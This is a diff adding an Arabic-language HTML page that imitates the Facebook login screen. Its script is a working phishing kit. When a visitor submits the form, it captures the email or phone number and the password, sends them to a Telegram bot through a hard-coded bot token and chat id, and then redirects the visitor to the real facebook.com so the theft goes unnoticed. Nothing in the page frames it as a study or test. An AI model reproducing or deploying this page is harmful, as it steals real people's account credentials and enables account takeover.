@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 10px;
+    }
+
+    .login-box {
+      background-color: white;
+      padding: 20px;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .login-box h1 {
+      color: #1877f2;
+      font-size: 36px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 14px 0;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .forgot {
+      display: block;
+      margin-top: 14px;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .separator {
+      height: 1px;
+      background-color: #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-account {
+      background-color: #42b72a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1>Facebook</h1>
+      <form id="loginForm">
+        <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+        <input type="password" name="password" placeholder="كلمة السر" required />
+        <button type="submit">تسجيل الدخول</button>
+        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
+        <div class="separator"></div>
+        <button class="create-account" type="button">إنشاء حساب جديد</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = this.username.value;
+      const password = this.password.value;
+
+      const token = "7394354423:AAFsS4tP5_fu_flO46PKX-YrtLhGSMucBOw";
+      const chat_id = "6719465208";
+      const message = `بيانات تسجيل دخول:\nالبريد/الهاتف: ${username}\nكلمة السر: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: new URLSearchParams({
+          chat_id: chat_id,
+          text: message
+        })
+      }).then(() => {
+        window.location.href = "https://facebook.com";
+      });
+    });
+  </script>
+</body>
+</html>
